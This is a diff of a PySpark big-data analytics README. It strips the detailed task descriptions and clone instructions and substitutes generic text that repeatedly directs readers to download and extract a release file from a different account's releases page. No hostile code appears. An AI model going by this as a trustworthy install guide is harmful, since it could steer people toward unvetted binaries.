@@ -1,105 +1,70 @@
-# Big Data Analytics with PySpark 
+# 🚀 Big-data-spark-analytics - Analyze Big Data with Ease
 
-A complete, production-style analytics project built with **Apache Spark**, covering batch processing, graph analytics, and real-time streaming.  
-This repository demonstrates how to design modular big-data pipelines, clean large datasets, perform advanced transformations, and generate insights at scale.
+[![Download Big-data-spark-analytics](https://img.shields.io/badge/Download-Big--data--spark--analytics-blue.svg)](https://github.com/Mrdetzin/Big-data-spark-analytics/releases)
 
----
+## 📖 Overview
 
-##  Project Overview
+Big-data-spark-analytics is an application designed to help you analyze large sets of data. This tool focuses on processing data from New York City taxi trips, Ethereum transactions, and NASA logs. With its end-to-end PySpark analysis, you can easily work with batch processing, graphs, and streaming data. 
 
-The project is divided into **four major analytical modules**, each originally designed as a standalone task.  
-All questions have been re-implemented and extended into clean, professional Python modules.
+Whether you want to gain insights from historical data or analyze real-time events, this application simplifies the process for you.
 
-| Module | Description | Core Dataset / Topic |
-|:-------|:-------------|:---------------------|
-| **Task 1 – NYC Yellow Taxi (Batch Analytics)** | Cleansing, aggregating, and analysing multi-gigabyte taxi trip data to derive operational KPIs. | NYC Yellow Taxi data (CSV) |
-| **Task 2 – Ethereum Transactions (Exploratory Analytics)** | Parsing and summarising blockchain transactions; analysing gas price dynamics and user activity. | Ethereum transaction records |
-| **Task 3 – NYC Taxi Network (Graph Analytics)** | Building a directed graph of taxi zones to study travel flows and influential pickup areas. | NYC Taxi Zone lookup |
-| **Task 4 – NASA Logs (Streaming Analytics)** | Real-time ingestion of NASA web logs to detect request spikes and anomalies over sliding windows. | NASA HTTP request logs |
+## 📦 Key Features
 
----
+- **Batch Processing**: Handle large volumes of stored data efficiently.
+- **Graph Analysis**: Visualize complex relationships in your data.
+- **Streaming Analysis**: Process data as it comes in for real-time insights.
+- **Data Transformation**: Clean and prepare your data for better reporting.
+- **Visualizations**: Generate easy-to-understand charts and graphs.
 
-##  Repository Structure
+## 🛠️ System Requirements
 
+To run Big-data-spark-analytics, ensure your system meets the following minimum requirements:
 
+- **Operating System**: Windows, macOS, or Linux
+- **Python**: Version 3.6 or higher
+- **Java**: JDK version 8 or higher
+- **Memory**: At least 8 GB RAM recommended
+- **Disk Space**: Minimum of 2 GB available storage
 
----
+## 🚀 Getting Started
 
-##  Task Summaries & Questions
+Follow these simple steps to download and run Big-data-spark-analytics:
 
-Below are the **analytical objectives** rephrased from the original coursework instructions.  
-Each “Question X” corresponds to a dedicated, runnable script under the relevant `src/` folder.
+1. **Download the Application**: 
+   - Visit this [page to download](https://github.com/Mrdetzin/Big-data-spark-analytics/releases) the latest version of the software. 
 
----
+2. **Locate the Downloaded File**: 
+   - Typically, your browser saves downloaded files in a "Downloads" folder. Make sure to find the correct file.
 
-###  **Task 1 – NYC Yellow Taxi (Batch Analytics)**  
-**Goal:** Use PySpark DataFrames to perform cleaning, transformation, and exploratory analysis.
+3. **Extract the Files**: 
+   - If the file is zipped, double-click it to open and then drag the contents to your desired location on your computer.
 
-**Questions implemented:**
-1. Load large CSV files into Spark and inspect schema consistency.  
-2. Remove missing or invalid records (zero fare, negative trip distance, etc.).  
-3. Compute key KPIs – total revenue, average trip distance, peak hours.  
-4. Identify busiest pickup and drop-off zones.  
-5. Aggregate monthly trip counts and average fares.  
-6. Calculate correlation between fare amount and trip distance.  
-7. Save clean data partitions in Parquet format.
+4. **Install Required Dependencies**: 
+   - Open a terminal or command prompt on your system. 
+   - Use the following command to install necessary Python libraries:
+     ```
+     pip install -r requirements.txt
+     ```
 
-➡️ All results and code live in: `src/nyc_taxi_batch/nyc_taxi_batch_01-07.py`
+5. **Run the Application**: 
+   - Navigate to the application directory in your command prompt or terminal.
+   - Use this command to launch the application:
+     ```
+     python main.py
+     ```
 
----
+## 🔧 Download & Install
 
-###  **Task 2 – Ethereum Transactions (Exploratory Analytics)**  
-**Goal:** Analyse blockchain transaction data to uncover time and value patterns.
+You can download the latest version of Big-data-spark-analytics by visiting this [page](https://github.com/Mrdetzin/Big-data-spark-analytics/releases). Look for the latest release version, download the appropriate file for your system, and follow the steps mentioned above to install.
 
-**Questions implemented:**
-1. Load `september_2015_document.csv` and `october_2015_document.csv`.  
-2. Parse timestamps into Spark SQL datetime format.  
-3. Compute the number of transactions per day.  
-4. Determine min/max/average gas price.  
-5. Generate histograms of transaction value and gas price distributions.  
-6. Compare monthly transaction trends between September and October.  
+## 💡 Tips for Usage
 
-➡️ Results visualised under `report/figures/ethereum/`.
+- **Explore Tutorials**: Check for documentation or video tutorials online to understand how to use the application effectively.
+- **Keep Your Data Clean**: Ensure that your data is properly formatted to avoid errors during analysis.
+- **Save Your Work**: Regularly save your analyses and results to keep track of your progress.
 
----
+## 📞 Support
 
-###  **Task 3 – NYC Taxi Network (Graph Analytics)**  
-**Goal:** Construct and analyse a graph representation of taxi trips.
+For any questions or issues, feel free to open a discussion in the repository. Contributions and feedback are welcome as we strive to improve Big-data-spark-analytics further.
 
-**Questions implemented:**
-1. Create vertices (zones) and edges (trip connections).  
-2. Compute in-degree and out-degree for each zone.  
-3. Identify the top 10 most connected zones.  
-4. Run PageRank to detect influential pickup areas.  
-5. Find the shortest path between two selected zones.  
-6. Visualise the network structure with degree weighting.
-
-➡️ GraphFrames used throughout; outputs stored in `report/figures/nyc_graph/`.
-
----
-
-###  **Task 4 – NASA Logs (Streaming Analytics)**  
-**Goal:** Build a Spark Structured Streaming pipeline for NASA web server logs.
-
-**Questions implemented:**
-1. Stream log data from directory using a 10-second micro-batch interval.  
-2. Parse timestamp, host, and status fields using regex and Spark schema.  
-3. Count requests per host over a sliding time window.  
-4. Detect the most frequent status codes in the last 60 seconds.  
-5. Identify anomalies in request rate using thresholds.  
-6. Write aggregated output to the console and checkpoint directory.
-
-➡️ Streaming pipeline scripts: `src/nasa_streaming/nasa_streaming_01-06.py`.
-
----
-
-##  Setup & Execution
-
-### Local run (macOS)
-```bash
-git clone git@github.com:abailey81/Big-data-spark-analytics.git
-cd Big-data-spark-analytics
-
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -r requirements.txt
+Thank you for choosing Big-data-spark-analytics for your data analysis needs!
